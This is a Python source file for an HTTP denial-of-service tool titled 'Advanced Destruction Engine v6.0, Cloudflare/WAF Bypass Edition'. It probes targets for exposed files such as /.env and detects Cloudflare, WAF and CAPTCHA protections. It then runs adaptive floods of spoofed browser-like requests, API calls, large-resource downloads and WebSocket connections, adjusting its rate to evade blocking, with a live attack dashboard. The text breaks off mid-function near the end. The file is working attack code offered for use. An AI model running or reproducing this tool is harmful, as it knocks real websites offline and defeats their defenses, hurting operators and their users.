#!/usr/bin/env python3
"""
██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                ADVANCED DESTRUCTION ENGINE v6.0
                CLOUDFLARE/WAF BYPASS EDITION
"""

import os
import sys
import time
import random
import threading
import socket
import asyncio
import aiohttp
import ssl
import urllib.parse
import json
import warnings
import urllib3
from datetime import datetime

# Disable all warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Rich imports
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.status import Status
from rich.syntax import Syntax
from rich import box
import colorama

# Initialize
colorama.init(autoreset=True)
console = Console()

# SSL context for ignoring certificate warnings
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# ==================== GLOBAL CONFIGURATION ====================
class Config:
    # Performance
    MAX_THREADS = 500
    MAX_RPS = 2000  # Reduced for WAF bypass
    CONNECTION_TIMEOUT = 15
    REQUEST_TIMEOUT = 20
    
    # Attack
    ATTACK_DURATION = 1800  # 30 minutes
    AUTO_RESTART = True
    STEALTH_MODE = False
    
    # Network
    USE_PROXY = False
    PROXY_LIST = []
    ROTATE_USER_AGENT = True
    ROTATE_IP = False
    
    # WAF Bypass
    ENABLE_WAF_BYPASS = True
    ADAPTIVE_ATTACK = True
    HUMAN_LIKE_DELAYS = True
    
    # Monitoring
    LOG_LEVEL = "INFO"
    SAVE_STATS = True
    
    @classmethod
    def update(cls, **kwargs):
        for key, value in kwargs.items():
            if hasattr(cls, key):
                setattr(cls, key, value)

# Global state
class AttackState:
    attacking = False
    start_time = 0
    stats = {
        'total_requests': 0,
        'successful': 0,
        'blocked': 0,
        'errors': 0,
        'bytes_sent': 0,
        'bytes_received': 0,
        'peak_rps': 0,
        'current_rps': 0,
        'targets_hit': 0,
        'unique_ips': set(),
        'waf_detected': False,
        'cloudflare_detected': False
    }
    lock = threading.Lock()
    last_count = 0

# ==================== USER AGENTS & HEADERS ====================
BROWSER_SIGNATURES = [
    # Chrome Windows
    {
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        }
    },
    # Firefox Linux
    {
        'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }
    },
    # Safari Mac
    {
        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0'
        }
    },
    # Mobile Chrome
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
    }
]

# Common referers
REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.reddit.com/',
    'https://www.linkedin.com/',
    'https://github.com/',
    'https://stackoverflow.com/'
]

# ==================== TARGET INFORMATION ====================
class TargetInfo:
    def __init__(self, url):
        self.url = url
        self.protocol = "http"
        self.host = ""
        self.port = 80
        self.path = "/"
        self.ip = ""
        self.ssl_enabled = False
        self.server_info = {}
        self.technologies = []
        self.vulnerabilities = []
        self.protection_detected = False
        self.protection_type = None  # 'cloudflare', 'waf', 'captcha', 'none'
        
    def parse(self):
        """Parse target URL"""
        try:
            if not self.url.startswith(('http://', 'https://')):
                self.url = 'http://' + self.url
            
            parsed = urllib.parse.urlparse(self.url)
            self.protocol = parsed.scheme
            self.host = parsed.hostname
            self.port = parsed.port or (443 if self.protocol == 'https' else 80)
            self.path = parsed.path or '/'
            self.ssl_enabled = (self.protocol == 'https')
            
            # Get IP address
            try:
                self.ip = socket.gethostbyname(self.host)
                AttackState.stats['unique_ips'].add(self.ip)
            except:
                self.ip = self.host
            
            return True
        except Exception as e:
            console.print(f"[red]✗ Error parsing target: {e}[/]")
            return False
    
    def scan_and_detect(self):
        """Scan target and detect protections"""
        try:
            import requests
            
            # Test request with browser-like headers
            browser = random.choice(BROWSER_SIGNATURES)
            headers = browser['headers'].copy()
            headers['User-Agent'] = browser['user_agent']
            
            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
            self.server_info = dict(response.headers)
            
            # Detect technologies
            self._detect_technologies(response)
            
            # Detect protections
            self._detect_protections(response)
            
            # Find vulnerabilities
            self._find_vulnerabilities()
            
            return True
        except Exception as e:
            console.print(f"[yellow]⚠️  Scan failed: {e}[/]")
            return False
    
    def _detect_technologies(self, response):
        """Detect web technologies"""
        tech_indicators = {
            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json', 'wordpress'],
            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
            'Drupal': ['/sites/default/', 'Drupal'],
            'Laravel': ['/storage/', 'laravel_session'],
            'Nginx': ['Server: nginx'],
            'Apache': ['Server: Apache'],
            'CloudFlare': ['cf-ray', 'cloudflare', '__cfduid', '__cf_bm'],
            'AWS': ['x-amz-cf-id', 'x-amz-cf-pop'],
            'PHP': ['PHP/', 'X-Powered-By: PHP'],
            'Node.js': ['X-Powered-By: Express'],
            'React': ['react', 'next.js'],
            'Vue.js': ['vue', 'nuxt.js']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for tech, indicators in tech_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content or indicator.lower() in headers:
                    if tech not in self.technologies:
                        self.technologies.append(tech)
                    break
    
    def _detect_protections(self, response):
        """Detect WAF and protection systems"""
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        # CloudFlare detection
        cloudflare_indicators = [
            'cloudflare',
            '__cfduid',
            '__cf_bm',
            'cf-ray',
            'checking your browser',
            'please wait',
            'ddos protection'
        ]
        
        for indicator in cloudflare_indicators:
            if indicator in headers or indicator in content:
                self.protection_detected = True
                self.protection_type = 'cloudflare'
                AttackState.stats['cloudflare_detected'] = True
                break
        
        # WAF detection
        waf_indicators = [
            '403 forbidden',
            'access denied',
            'your request has been blocked',
            'security violation',
            'waf',
            'imperva',
            'akamai',
            'sucuri',
            'incapsula'
        ]
        
        if not self.protection_detected:
            for indicator in waf_indicators:
                if indicator in content:
                    self.protection_detected = True
                    self.protection_type = 'waf'
                    AttackState.stats['waf_detected'] = True
                    break
        
        # CAPTCHA detection
        captcha_indicators = [
            'captcha',
            'recaptcha',
            'hcaptcha',
            'verify you are human',
            'are you a human'
        ]
        
        if not self.protection_detected:
            for indicator in captcha_indicators:
                if indicator in content:
                    self.protection_detected = True
                    self.protection_type = 'captcha'
                    break
    
    def _find_vulnerabilities(self):
        """Find common vulnerabilities"""
        import requests
        
        vuln_endpoints = [
            '/xmlrpc.php',
            '/wp-json/wp/v2/users',
            '/.env',
            '/phpinfo.php',
            '/server-status',
            '/admin/config.php',
            '/debug',
            '/test',
            '/backup',
            '/database.sql',
            '/wp-admin/install.php',
            '/administrator/index.php',
            '/cgi-bin/test.cgi',
            '/api/v1/users',
            '/graphql'
        ]
        
        for endpoint in vuln_endpoints:
            try:
                test_url = f"{self.url.rstrip('/')}{endpoint}"
                browser = random.choice(BROWSER_SIGNATURES)
                headers = browser['headers'].copy()
                headers['User-Agent'] = browser['user_agent']
                
                resp = requests.get(test_url, headers=headers, timeout=3, verify=False)
                if resp.status_code in [200, 403, 500]:
                    self.vulnerabilities.append(endpoint)
            except:
                continue

# ==================== ADVANCED ATTACK VECTORS ====================
class SmartAttackVectors:
    """Smart attack vectors with WAF bypass"""
    
    @staticmethod
    async def human_like_request(target, session):
        """Human-like request with random behavior"""
        try:
            # Random human-like delay
            if Config.HUMAN_LIKE_DELAYS:
                await asyncio.sleep(random.uniform(0.1, 2.0))
            
            # Select random browser signature
            browser = random.choice(BROWSER_SIGNATURES)
            
            # Build realistic URL
            paths = [
                '/', '/index.html', '/home', '/main', '/default.aspx',
                '/about', '/contact', '/products', '/services', '/blog',
                '/news', '/articles', '/faq', '/help', '/support'
            ]
            path = random.choice(paths)
            
            # Add realistic parameters
            params = []
            if random.random() > 0.4:
                params.append(f"utm_source={random.choice(['google', 'facebook', 'twitter', 'direct'])}")
            if random.random() > 0.6:
                params.append(f"utm_medium={random.choice(['organic', 'cpc', 'social', 'email'])}")
            if random.random() > 0.7:
                params.append(f"ref={random.choice(['homepage', 'internal', 'external'])}")
            if random.random() > 0.5:
                params.append(f"_={random.randint(1000000000, 9999999999)}")
            
            param_str = "?" + "&".join(params) if params else ""
            
            # Build URL
            if target.port in [80, 443]:
                url = f"{target.protocol}://{target.host}{path}{param_str}"
            else:
                url = f"{target.protocol}://{target.host}:{target.port}{path}{param_str}"
            
            # Prepare headers
            headers = browser['headers'].copy()
            headers['User-Agent'] = browser['user_agent']
            
            # Add random referer
            if random.random() > 0.3:
                headers['Referer'] = random.choice(REFERERS)
            
            # Add cookies for session persistence
            if random.random() > 0.5:
                headers['Cookie'] = f"session_id={random.randint(10000, 99999)}; visited=true"
            
            # Random request method
            methods = ['GET', 'HEAD', 'POST']
            method_weights = [0.7, 0.1, 0.2]  # GET most common
            method = random.choices(methods, weights=method_weights)[0]
            
            if method == 'GET':
                async with session.get(url, headers=headers, ssl=ssl_context, 
                                     timeout=aiohttp.ClientTimeout(total=15)) as response:
                    return await SmartAttackVectors._analyze_response(response, headers, url)
            
            elif method == 'POST':
                # Realistic POST data
                post_data = {
                    'search': random.choice(['', 'test', 'query', 'product']),
                    'email': f"user{random.randint(1, 1000)}@example.com",
                    'name': random.choice(['John', 'Jane', 'Mike', 'Sarah']),
                    'message': random.choice(['', 'Hello', 'Test message', 'Inquiry'])
                }
                
                async with session.post(url, data=post_data, headers=headers, ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=15)) as response:
                    return await SmartAttackVectors._analyze_response(response, headers, url, post_data)
            
            else:  # HEAD
                async with session.head(url, headers=headers, ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
                    return await SmartAttackVectors._analyze_response(response, headers, url)
                    
        except asyncio.TimeoutError:
            return 'timeout'
        except Exception as e:
            return 'error'
    
    @staticmethod
    async def _analyze_response(response, headers, url, data=None):
        """Analyze HTTP response for protections"""
        try:
            content = await response.read()
            content_text = content.decode('utf-8', errors='ignore').lower()
            
            # Update statistics
            with AttackState.lock:
                AttackState.stats['bytes_sent'] += len(str(headers)) + len(url)
                if data:
                    AttackState.stats['bytes_sent'] += len(str(data))
                AttackState.stats['bytes_received'] += len(content)
            
            # Check for protections
            protection_indicators = {
                'cloudflare': ['cloudflare', 'checking your browser', 'please wait', 'ddos protection'],
                'captcha': ['captcha', 'recaptcha', 'hcaptcha', 'verify you are human', 'are you a human'],
                'waf': ['403 forbidden', 'access denied', 'blocked', 'security violation', 'waf'],
                'rate_limit': ['429 too many requests', 'rate limit exceeded', 'slow down']
            }
            
            for protection_type, indicators in protection_indicators.items():
                for indicator in indicators:
                    if indicator in content_text:
                        return f'blocked_{protection_type}'
            
            # Check status code
            if 200 <= response.status < 400:
                return 'success'
            elif response.status == 429:
                return 'blocked_rate_limit'
            elif response.status in [403, 503, 520, 521, 522, 523]:
                return 'blocked_waf'
            else:
                return 'success'
                
        except:
            return 'error'
    
    @staticmethod
    async def api_endpoint_flood(target, session):
        """Flood API endpoints"""
        try:
            # Common API endpoints
            api_endpoints = [
                '/api/v1/users',
                '/api/v1/products',
                '/api/v1/posts',
                '/graphql',
                '/rest/v1/',
                '/wp-json/wp/v2/',
                '/api/auth/login',
                '/api/search',
                '/api/health',
                '/api/status'
            ]
            
            endpoint = random.choice(api_endpoints)
            url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
            
            # API-specific headers
            headers = {
                'User-Agent': random.choice(BROWSER_SIGNATURES)['user_agent'],
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': f"{target.protocol}://{target.host}"
            }
            
            # Add API token if available
            if random.random() > 0.7:
                headers['Authorization'] = f'Bearer token_{random.randint(100000, 999999)}'
            
            # Random API request
            if random.random() > 0.5:
                # GET request
                async with session.get(url, headers=headers, ssl=ssl_context,
                                     timeout=aiohttp.ClientTimeout(total=10)) as response:
                    await response.read()
                    return 'success' if response.status < 500 else 'error'
            else:
                # POST request with JSON
                json_data = {
                    'query': random.choice(['', 'test', 'search', 'filter']),
                    'page': random.randint(1, 10),
                    'limit': random.choice([10, 20, 50]),
                    'sort': random.choice(['date', 'name', 'price'])
                }
                
                async with session.post(url, json=json_data, headers=headers, ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
                    await response.read()
                    return 'success' if response.status < 500 else 'error'
                
        except:
            return 'error'
    
    @staticmethod
    async def resource_exhaustion(target, session):
        """Exhaust server resources"""
        try:
            # Request large resources
            resource_paths = [
                '/large-image.jpg',
                '/big-file.pdf',
                '/video.mp4',
                '/archive.zip',
                '/database-backup.sql',
                '/log-file.log'
            ]
            
            path = random.choice(resource_paths)
            url = f"{target.protocol}://{target.host}:{target.port}{path}"
            
            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
            
            # Request with range header to get partial content
            if random.random() > 0.5:
                headers['Range'] = f'bytes={random.randint(0, 1000000)}-{random.randint(1000000, 5000000)}'
            
            async with session.get(url, headers=headers, ssl=ssl_context,
                                 timeout=aiohttp.ClientTimeout(total=20)) as response:
                # Read in chunks to consume bandwidth
                total_read = 0
                async for chunk in response.content.iter_chunked(8192):
                    total_read += len(chunk)
                    if total_read > 1048576:  # Stop after 1MB
                        break
                
                return 'success' if response.status < 500 else 'error'
                
        except:
            return 'error'
    
    @staticmethod
    async def websocket_connection(target, session):
        """WebSocket connection flood"""
        try:
            ws_url = f"ws://{target.host}:{target.port}/ws" if target.protocol == 'http' else f"wss://{target.host}:{target.port}/ws"
            
            # Try common WebSocket endpoints
            endpoints = ['/ws', '/websocket', '/socket.io/', '/wss', '/live']
            
            for endpoint in endpoints:
                try:
                    full_ws_url = f"ws://{target.host}:{target.port}{endpoint}" if target.protocol == 'http' else f"wss://{target.host}:{target.port}{endpoint}"
                    
                    async with session.ws_connect(full_ws_url, timeout=3) as ws:
                        # Send ping
                        await ws.ping()
                        await asyncio.sleep(0.5)
                        
                        # Send some data
                        await ws.send_str(json.dumps({
                            'type': 'ping',
                            'timestamp': int(time.time())
                        }))
                        
                        await asyncio.sleep(1)
                        await ws.close()
                        return 'success'
                        
                except:
                    continue
            
            return 'error'
        except:
            return 'error'
            # ==================== SMART ATTACK MANAGER ====================
class SmartAttackManager:
    """Smart attack manager with adaptive WAF bypass"""
    
    def __init__(self, target):
        self.target = target
        self.session = None
        self.attack_methods = [
            SmartAttackVectors.human_like_request,
            SmartAttackVectors.api_endpoint_flood,
            SmartAttackVectors.resource_exhaustion,
            SmartAttackVectors.websocket_connection
        ]
        self.method_weights = [0.5, 0.2, 0.2, 0.1]  # Weighted random selection
        self.blocked_counter = {
            'cloudflare': 0,
            'captcha': 0,
            'waf': 0,
            'rate_limit': 0,
            'total': 0
        }
        self.success_counter = 0
        self.adaptive_mode = 'normal'  # normal, stealth, aggressive
    
    async def init_session(self):
        """Initialize smart session with cookies"""
        timeout = aiohttp.ClientTimeout(
            total=Config.REQUEST_TIMEOUT,
            connect=8,
            sock_read=12,
            sock_connect=8
        )
        
        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=ssl_context,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        # Cookie jar for session persistence
        cookie_jar = aiohttp.CookieJar()
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=cookie_jar
        )
    
    def _update_adaptive_mode(self):
        """Update attack mode based on success rate"""
        total_attempts = self.blocked_counter['total'] + self.success_counter
        if total_attempts == 0:
            return
        
        success_rate = (self.success_counter / total_attempts) * 100
        
        if success_rate < 20:
            self.adaptive_mode = 'stealth'
            console.print("[yellow]🔄 Switching to STEALTH mode (low success rate)[/]")
        elif success_rate > 70:
            self.adaptive_mode = 'aggressive'
            console.print("[green]⚡ Switching to AGGRESSIVE mode (high success rate)[/]")
        else:
            self.adaptive_mode = 'normal'
    
    def _get_attack_delay(self):
        """Get adaptive delay based on mode"""
        base_delay = 1.0 / Config.MAX_RPS
        
        if self.adaptive_mode == 'stealth':
            # Slower, more human-like
            return base_delay * random.uniform(2.0, 5.0)
        elif self.adaptive_mode == 'aggressive':
            # Faster, but still random
            return base_delay * random.uniform(0.5, 1.5)
        else:  # normal
            return base_delay * random.uniform(0.8, 2.0)
    
    async def smart_worker(self, worker_id):
        """Smart attack worker with adaptive behavior"""
        while AttackState.attacking:
            try:
                # Update adaptive mode every 100 requests
                if worker_id == 0 and AttackState.stats['total_requests'] % 100 == 0:
                    self._update_adaptive_mode()
                
                # Select attack method with weights
                attack_method = random.choices(
                    self.attack_methods, 
                    weights=self.method_weights, 
                    k=1
                )[0]
                
                # Execute attack
                result = await attack_method(self.target, self.session)
                
                # Update statistics
                with AttackState.lock:
                    AttackState.stats['total_requests'] += 1
                    
                    if result == 'success':
                        AttackState.stats['successful'] += 1
                        self.success_counter += 1
                        self.blocked_counter['total'] = max(0, self.blocked_counter['total'] - 1)
                    
                    elif result.startswith('blocked_'):
                        block_type = result.split('_')[1]
                        AttackState.stats['blocked'] += 1
                        self.blocked_counter[block_type] += 1
                        self.blocked_counter['total'] += 1
                        
                        # Adjust weights based on block type
                        if block_type in ['cloudflare', 'captcha']:
                            # Reduce human_like weight, increase others
                            self.method_weights[0] = max(0.1, self.method_weights[0] - 0.05)
                            self.method_weights[1] = min(0.4, self.method_weights[1] + 0.03)
                            self.method_weights[2] = min(0.4, self.method_weights[2] + 0.02)
                    
                    else:
                        AttackState.stats['errors'] += 1
                
                # Adaptive delay
                delay = self._get_attack_delay()
                await asyncio.sleep(delay)
                    
            except Exception as e:
                with AttackState.lock:
                    AttackState.stats['errors'] += 1
    
    async def start_smart_attack(self, num_workers):
        """Start smart adaptive attack"""
        await self.init_session()
        
        # Initial delay for reconnaissance
        console.print("[yellow]🔍 Performing initial reconnaissance...[/]")
        await asyncio.sleep(2)
        
        # Create workers
        tasks = []
        worker_count = min(num_workers, Config.MAX_THREADS)
        
        for i in range(worker_count):
            task = asyncio.create_task(self.smart_worker(i))
            tasks.append(task)
        
        # Adaptive monitoring loop
        try:
            start_time = time.time()
            last_adjustment = start_time
            last_report = start_time
            
            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
                await asyncio.sleep(1)
                
                current_time = time.time()
                
                # Adjust strategy every 30 seconds
                if current_time - last_adjustment > 30:
                    self._adjust_attack_strategy()
                    last_adjustment = current_time
                
                # Print status every 10 seconds
                if current_time - last_report > 10:
                    self._print_status_report()
                    last_report = current_time
                    
        finally:
            # Cleanup
            for task in tasks:
                task.cancel()
            
            if self.session:
                await self.session.close()
    
    def _adjust_attack_strategy(self):
        """Adjust attack strategy based on performance"""
        total = AttackState.stats['total_requests']
        if total == 0:
            return
        
        success_rate = (AttackState.stats['successful'] / total) * 100
        block_rate = (AttackState.stats['blocked'] / total) * 100
        
        console.print(f"[cyan]📊 Adaptive adjustment: Success={success_rate:.1f}%, Blocked={block_rate:.1f}%[/]")
        
        if block_rate > 50:
            # High block rate, reduce intensity
            Config.MAX_RPS = max(100, int(Config.MAX_RPS * 0.7))
            console.print(f"[yellow]⚠️  High block rate detected, reducing RPS to {Config.MAX_RPS}[/]")
        
        elif success_rate > 80 and block_rate < 10:
            # Good performance, increase intensity
            Config.MAX_RPS = min(5000, int(Config.MAX_RPS * 1.2))
            console.print(f"[green]✅ Good performance, increasing RPS to {Config.MAX_RPS}[/]")
    
    def _print_status_report(self):
        """Print periodic status report"""
        stats = AttackMonitor.calculate_stats()
        
        report = Panel.fit(
            f"[bold cyan]🔄 ADAPTIVE STATUS REPORT[/]\n\n"
            f"[yellow]Mode:[/] {self.adaptive_mode.upper()}\n"
            f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
            f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n"
            f"[blue]Current RPS:[/] {stats['current_rps']:,}\n"
            f"[magenta]Threads Active:[/] {Config.MAX_THREADS}\n"
            f"[cyan]Protection Detected:[/] {self.target.protection_type or 'None'}",
            border_style="bold cyan",
            padding=(1, 2)
        )
        
        console.print(report)

# ==================== MONITORING & DISPLAY ====================
class AttackMonitor:
    """Monitor and display attack statistics"""
    current_target = ""
    
    @staticmethod
    def calculate_stats():
        """Calculate current statistics"""
        with AttackState.lock:
            total = AttackState.stats['total_requests']
            elapsed = time.time() - AttackState.start_time
            
            # Calculate RPS
            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
            AttackState.stats['current_rps'] = current_rps
            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
            AttackState.last_count = total
            
            # Calculate bandwidth
            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            # Success rate
            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
            
            return {
                'total_requests': total,
                'successful': AttackState.stats['successful'],
                'blocked': AttackState.stats['blocked'],
                'errors': AttackState.stats['errors'],
                'current_rps': int(current_rps),
                'peak_rps': int(AttackState.stats['peak_rps']),
                'mbps_sent': mbps_sent,
                'mbps_recv': mbps_recv,
                'success_rate': success_rate,
                'elapsed_time': int(elapsed),
                'unique_ips': len(AttackState.stats['unique_ips']),
                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024,
                'waf_detected': AttackState.stats['waf_detected'],
                'cloudflare_detected': AttackState.stats['cloudflare_detected']
            }
    
    @staticmethod
    def display_dashboard():
        """Display real-time dashboard"""
        with Live(refresh_per_second=2, screen=True) as live:
            while AttackState.attacking:
                stats = AttackMonitor.calculate_stats()
                
                # Create layout
                layout = Layout()
                layout.split_column(
                    Layout(name="header", size=3),
                    Layout(name="main", ratio=2),
                    Layout(name="footer", size=7)
                )
                
                # Header with protection info
                protection_status = ""
                if stats['cloudflare_detected']:
                    protection_status = "[red]☁️ CLOUDFLARE DETECTED[/]"
                elif stats['waf_detected']:
                    protection_status = "[yellow]🛡️ WAF DETECTED[/]"
                else:
                    protection_status = "[green]✅ NO PROTECTION[/]"
                
                header = Panel(
                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v6.0[/] | "
                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
                    f"{protection_status} | "
                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
                    border_style="bold red"
                )
                layout["header"].update(header)
                
                # Main stats
                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
                main_table.add_column("METRIC", style="yellow", width=20)
                main_table.add_column("VALUE", style="green", width=15)
                main_table.add_column("STATUS", style="magenta", width=20)
                
                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%", 
                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
                main_table.add_row("Protection", f"{'☁️ CloudFlare' if stats['cloudflare_detected'] else '🛡️ WAF' if stats['waf_detected'] else '✅ None'}", "")
                
                layout["main"].update(Panel(main_table, border_style="bold blue"))
                
                # Footer - Progress bars
                progress_text = Text()
                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
                
                # Progress bars
                progress_table = Table(show_header=False, box=None)
                progress_table.add_column(width=50)
                
                # Success rate bar
                success_bar_length = int(stats['success_rate'] / 2)
                success_bar = "█" * success_bar_length + "░" * (50 - success_bar_length)
                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
                
                # RPS progress
                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
                rps_bar_length = int(rps_percent / 2)
                rps_bar = "█" * rps_bar_length + "░" * (50 - rps_bar_length)
                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
                
                # Protection indicator
                if stats['cloudflare_detected']:
                    protection_bar = "█" * 25 + "░" * 25
                    progress_table.add_row(f"Protection:  [{protection_bar}] CLOUDFLARE ACTIVE")
                elif stats['waf_detected']:
                    protection_bar = "█" * 15 + "░" * 35
                    progress_table.add_row(f"Protection:  [{protection_bar}] WAF ACTIVE")
                
                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS & PROTECTION", border_style="bold green"))
                
                live.update(layout)
                time.sleep(0.5)

# ==================== MAIN FUNCTIONS ====================
def show_banner():
    """Display banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ║
    ║   ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗ ║
    ║   ██║  ███╗██████╔╝███████║██║     █████╔╝ ███████║██████╔╝ ║
    ║   ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗ ║
    ║   ╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║ ║
    ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
    ║                                                              ║
    ║               ADVANCED DESTRUCTION ENGINE v6.0               ║
    ║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))
    
    # Show features
    features = Panel.fit(
